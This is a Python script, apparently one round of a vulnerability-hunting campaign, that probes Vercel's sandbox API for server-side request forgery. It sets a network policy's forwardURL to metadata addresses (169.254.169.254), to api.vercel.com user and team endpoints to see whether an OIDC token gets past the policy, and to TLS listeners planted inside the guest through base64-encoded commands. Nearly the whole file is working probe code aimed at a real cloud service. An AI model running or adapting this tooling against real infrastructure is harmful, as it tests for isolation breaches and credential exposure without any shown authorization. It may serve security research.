# -*- coding: utf-8 -*-
"""forwardURL https SSRF 语义区分 II (v50)
背景: v49 证明 502 != DNS失败, 执行点不在 guest netns。
本轮:
  A1 1.1.1.1            -> 公网 IP 直连对照 (Cloudflare 有有效证书 -> 非502=IP直连允许)
  A2 8.8.8.8            -> 公网 IP 无 TLS 服务 (502 对照)
  A3 api.vercel.com/v2/user  -> ★ OIDC token 是否被 Vercel API 接受 (策略绕过?)
  A4 api.vercel.com/v2/teams -> ★ 同上第二端点
  A5 httpbin.org/redirect/1  -> 无 query 302, 确认执行点是否跟随
  A6 httpbin.org/anything    -> 无 query 回显, 看完整请求头
  A7 169.254.169.254     -> MMDS 无路径重跑
  B1 guest eth0 IP TLS 监听 -> ★ 执行点能否路由到 guest 网络 (连接日志铁证)
  B2 guest 127.0.0.1 TLS 监听 -> TLS 版 T1 (连接日志对照)
"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'tf50'

TLS_LSN = (
    "import socket,ssl,time,subprocess\n"
    "subprocess.run('openssl req -x509 -newkey rsa:2048 -keyout /tmp/k.pem -out /tmp/c.pem -days 1 -nodes -subj /CN=tlsprobe -batch >/dev/null 2>&1',shell=True)\n"
    "ctx=ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)\n"
    "ctx.load_cert_chain('/tmp/c.pem','/tmp/k.pem')\n"
    "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
    "s.bind(('BINDIP',8443));s.listen(5)\n"
    "log=open('/tmp/tls.log','a')\n"
    "log.write('TLS_START %s\\n'%time.time());log.flush()\n"
    "while True:\n"
    "    try:\n"
    "        c,a=s.accept();log.write('CONN from %s %s\\n'%(a,time.time()));log.flush()\n"
    "        try:\n"
    "            sc=ctx.wrap_socket(c,server_side=True);sc.settimeout(5)\n"
    "            d=sc.recv(4096);log.write('DATA %r\\n'%d[:400]);log.flush()\n"
    "            sc.sendall(b'HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nOK')\n"
    "            sc.close()\n"
    "        except Exception as e:\n"
    "            log.write('TLSERR %s\\n'%repr(e)[:150]);log.flush()\n"
    "            try:c.close()\n"
    "            except:pass\n"
    "    except Exception as e:\n"
    "        log.write('FATAL %s\\n'%e);log.flush();time.sleep(1)\n"
)

def api_retry(method, path, body=None, timeout=60, tries=4):
    for i in range(tries):
        try:
            return api(method, path, body, timeout)
        except Exception as e:
            print('[api-retry %d] %s' % (i + 1, e), flush=True)
            time.sleep(5)
    return -1, 'EXC'

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def mk(fwd):
    api_retry("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    body = {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"allow": {"httpbin.org": [{"forwardURL": fwd}]}}}
    for attempt in range(8):
        c, r = api_retry("POST", "/v4/sandboxes?teamId=%s" % TEAM, body, 90)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    ok = c == 200
    print('[create %s] -> %d %s' % (fwd[:70], c, (r or '')[:130]), flush=True)
    if not ok:
        return None
    return json.loads(r)['sandbox']['currentSessionId']

def guest_ip(sid):
    c, r = cmd(sid, 'sh', ['-c', 'hostname -I 2>/dev/null || ip -4 addr show eth0 | grep inet'], timeout_ms=20000)
    txt = parse_data(r).strip().split()
    for t in txt:
        if t.count('.') == 3:
            return t
    return None

def start_tls(sid, bind):
    src = TLS_LSN.replace('BINDIP', bind)
    b64 = base64.b64encode(src.encode()).decode()
    c, r = cmd(sid, 'python3', ['-c', 'import base64;open("/tmp/tlslsn.py","w").write(base64.b64decode("%s").decode())' % b64], timeout_ms=30000)
    c, r = cmd(sid, 'sh', ['-c', 'nohup python3 /tmp/tlslsn.py >/tmp/tls.out 2>&1 & sleep 3; grep -c 20FB /proc/net/tcp; cat /tmp/tls.out'], timeout_ms=30000)
    txt = parse_data(r)
    ok = 'TLS_START' in txt
    print('[tls] bind=%s ok=%s %s' % (bind, ok, txt.strip()[:160]), flush=True)
    return ok

def tls_log(sid):
    c, r = cmd(sid, 'sh', ['-c', 'echo ==TLSLOG==; cat /tmp/tls.log 2>/dev/null; echo ==OUT==; cat /tmp/tls.out 2>/dev/null'], timeout_ms=20000)
    return parse_data(r).strip()

def probe(sid, tag):
    guest = ('echo "== %s"; curl -s --max-time 12 -k -i https://httpbin.org/ 2>&1 | head -16') % tag
    b64 = base64.b64encode(guest.encode()).decode()
    c, r = cmd(sid, 'python3', ['-c', 'import base64;open("/tmp/g.sh","w").write(base64.b64decode("%s").decode())' % b64], timeout_ms=30000)
    c, r = cmd(sid, 'sh', ['/tmp/g.sh'], timeout_ms=45000)
    print('[%s] %s' % (tag, parse_data(r).strip()[:1000]), flush=True)

if __name__ == '__main__':
    # ---- 第一组: 无监听器的对照 ----
    tests1 = [
        ('A1-cfip',   'https://1.1.1.1/'),
        ('A2-gdns',   'https://8.8.8.8/'),
        ('A3-api-user','https://api.vercel.com/v2/user'),
        ('A4-api-team','https://api.vercel.com/v2/teams'),
        ('A5-redir1', 'https://httpbin.org/redirect/1'),
        ('A6-anything','https://httpbin.org/anything/forward_ctl'),
        ('A7-mmds',   'https://169.254.169.254/'),
    ]
    for tag, fwd in tests1:
        print('=== %s (%s) ===' % (tag, fwd[:80]), flush=True)
        sid = mk(fwd)
        if not sid:
            time.sleep(2)
            continue
        time.sleep(8)
        probe(sid, tag)
        api_retry("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
        time.sleep(3)

    # ---- B1: guest eth0 IP + TLS 监听 ----
    print('=== B1-eth0ip ===', flush=True)
    sid = mk('https://httpbin.org/anything/b1_placeholder')
    if sid:
        ip = guest_ip(sid)
        print('[B1] guest eth0 ip = %s' % ip, flush=True)
        api_retry("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
        time.sleep(3)
        if ip:
            sid2 = mk('https://%s:8443/' % ip)
            if sid2:
                time.sleep(8)
                start_tls(sid2, '0.0.0.0')
                time.sleep(2)
                probe(sid2, 'B1-eth0ip')
                print('[B1-log] %s' % tls_log(sid2)[:600], flush=True)
                api_retry("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
                time.sleep(3)

    # ---- B2: guest 127.0.0.1 + TLS 监听 ----
    print('=== B2-loTLS ===', flush=True)
    sid = mk('https://127.0.0.1:8443/')
    if sid:
        time.sleep(8)
        start_tls(sid, '127.0.0.1')
        time.sleep(2)
        probe(sid, 'B2-loTLS')
        print('[B2-log] %s' % tls_log(sid)[:600], flush=True)
        api_retry("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
        time.sleep(3)
    print('CLEANED', flush=True)
